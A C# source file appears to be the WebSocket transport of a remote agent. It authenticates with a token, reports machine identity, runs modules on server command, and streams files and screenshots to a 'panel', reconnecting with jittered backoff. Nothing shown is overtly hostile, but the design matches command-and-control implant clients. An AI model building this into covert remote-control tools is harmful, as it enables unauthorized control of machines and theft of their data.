using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json.Nodes;

namespace WRAgent
{
    internal sealed class Transport
    {
        public static readonly Transport I = new Transport();

        private const int BlobChunk = 256 * 1024;

        private readonly SemaphoreSlim _sendLock = new SemaphoreSlim(1, 1);
        private readonly BlockingCollection<JsonObject> _queue = new BlockingCollection<JsonObject>();
        private readonly CancellationTokenSource _cts = new CancellationTokenSource();

        private ClientWebSocket _ws;
        private Task _worker;
        private int _fails;

        public bool Connected => _ws != null && _ws.State == WebSocketState.Open;

        // ---------------------------------------------------------------
        public async Task RunAsync()
        {
            _worker ??= Task.Run(WorkerLoop);

            while (!_cts.IsCancellationRequested)
            {
                try
                {
                    var ep = await Resolver.GetAsync().ConfigureAwait(false);
                    if (!ep.Enabled)
                    {
                        Log.W("resolver: disabled by config");
                        await Task.Delay(TimeSpan.FromMinutes(2)).ConfigureAwait(false);
                        continue;
                    }

                    if (!await ConnectAsync(ep.Url).ConfigureAwait(false))
                        throw new Exception("connect failed");

                    _fails = 0;
                    await HelloAsync().ConfigureAwait(false);
                    await ReceiveLoopAsync().ConfigureAwait(false);
                }
                catch (Exception e)
                {
                    Log.W("transport: " + e.Message);
                }
                finally
                {
                    try { _ws?.Dispose(); } catch { }
                    _ws = null;
                }

                _fails++;
                var secs = Math.Min(300, 5 * Math.Pow(1.7, Math.Min(_fails, 8)));
                var delay = TimeSpan.FromSeconds(secs) +
                            TimeSpan.FromMilliseconds(Random.Shared.Next(0, 5000));
                await Task.Delay(delay).ConfigureAwait(false);
            }
        }

        private async Task<bool> ConnectAsync(string url)
        {
            var ws = new ClientWebSocket();
            ws.Options.SetRequestHeader("X-Agent-Token", BuildInfo.AgentToken);
            ws.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);

            using var timeout = new CancellationTokenSource(TimeSpan.FromSeconds(25));
            try
            {
                await ws.ConnectAsync(new Uri(url), timeout.Token).ConfigureAwait(false);
                _ws = ws;
                return true;
            }
            catch (Exception e)
            {
                Log.W("connect: " + e.Message);
                ws.Dispose();
                return false;
            }
        }

        private Task HelloAsync()
        {
            var info = SystemModule.Identity();
            info["type"] = "hello";
            info["agent_id"] = Util.MachineId();
            info["ver"] = BuildInfo.Version;
            return SendAsync(info);
        }

        private async Task ReceiveLoopAsync()
        {
            var ws = _ws;
            var buffer = new byte[16 * 1024];
            using var ms = new MemoryStream();

            var heartbeat = Task.Run(async () =>
            {
                while (ws != null && ws.State == WebSocketState.Open)
                {
                    await Task.Delay(TimeSpan.FromSeconds(25)).ConfigureAwait(false);
                    if (ws.State != WebSocketState.Open) return;
                    await SendAsync(new JsonObject { ["type"] = "pong" }).ConfigureAwait(false);
                }
            });

            try
            {
                while (ws != null && ws.State == WebSocketState.Open)
                {
                    ms.SetLength(0);
                    WebSocketReceiveResult r;
                    do
                    {
                        r = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), _cts.Token)
                                    .ConfigureAwait(false);
                        if (r.MessageType == WebSocketMessageType.Close) return;
                        ms.Write(buffer, 0, r.Count);
                        if (ms.Length > 64L * 1024 * 1024) return;
                    }
                    while (!r.EndOfMessage);

                    if (ms.Length == 0) continue;
                    JsonObject msg;
                    try
                    {
                        msg = JsonNode.Parse(Encoding.UTF8.GetString(ms.ToArray())) as JsonObject;
                    }
                    catch { continue; }
                    if (msg is null) continue;

                    if (Util.Str(msg, "type") == "cmd")
                        _queue.Add(msg);
                }
            }
            catch (Exception e)
            {
                Log.W("recv: " + e.Message);
            }
            finally
            {
                try { heartbeat.Dispose(); } catch { }
            }
        }

        // ---------------------------------------------------------------
        private async Task WorkerLoop()
        {
            foreach (var cmd in _queue.GetConsumingEnumerable())
            {
                var id = Util.Str(cmd, "id");
                var module = Util.Str(cmd, "module");
                var args = cmd["args"] as JsonObject ?? new JsonObject();

                JsonObject body;
                try
                {
                    body = await ModuleHost.ExecuteAsync(module, args, this).ConfigureAwait(false);
                }
                catch (Exception e)
                {
                    body = new JsonObject { ["ok"] = false, ["error"] = e.ToString() };
                }

                if (body != null)
                {
                    await SendAsync(new JsonObject
                    {
                        ["type"] = "result",
                        ["id"] = id,
                        ["body"] = body
                    }).ConfigureAwait(false);
                }

                if (module == "exit")
                {
                    await Task.Delay(400).ConfigureAwait(false);
                    Environment.Exit(0);
                }
            }
        }

        // ---------------------------------------------------------------
        public async Task SendAsync(JsonObject obj)
        {
            var ws = _ws;
            if (ws is null || ws.State != WebSocketState.Open || obj is null) return;

            var bytes = Encoding.UTF8.GetBytes(obj.ToJsonString());
            await _sendLock.WaitAsync().ConfigureAwait(false);
            try
            {
                if (ws.State == WebSocketState.Open)
                    await ws.SendAsync(new ArraySegment<byte>(bytes),
                        WebSocketMessageType.Text, true, _cts.Token).ConfigureAwait(false);
            }
            catch (Exception e)
            {
                Log.W("send: " + e.Message);
            }
            finally
            {
                _sendLock.Release();
            }
        }

        public async Task EmitAsync(string kind, string text)
        {
            await SendAsync(new JsonObject
            {
                ["type"] = "event",
                ["kind"] = kind,
                ["data"] = text
            }).ConfigureAwait(false);
        }

        /// <summary>Chunked binary transfer to the panel (downloads, screenshots).</summary>
        public async Task EmitBlobAsync(string kind, JsonObject meta, byte[] data)
        {
            var xid = Guid.NewGuid().ToString("N");
            var total = data.Length == 0 ? 1 : (int)Math.Ceiling(data.Length / (double)BlobChunk);

            for (var i = 0; i < total; i++)
            {
                var off = i * BlobChunk;
                var len = Math.Max(0, Math.Min(BlobChunk, data.Length - off));
                await SendAsync(new JsonObject
                {
                    ["type"] = "event",
                    ["kind"] = "xfer",
                    ["xfer"] = xid,
                    ["name"] = kind,
                    ["seq"] = i,
                    ["total"] = total,
                    ["meta"] = meta?.DeepClone() as JsonObject ?? new JsonObject(),
                    ["data"] = len > 0 ? Convert.ToBase64String(data, off, len) : ""
                }).ConfigureAwait(false);
            }
        }
    }
}
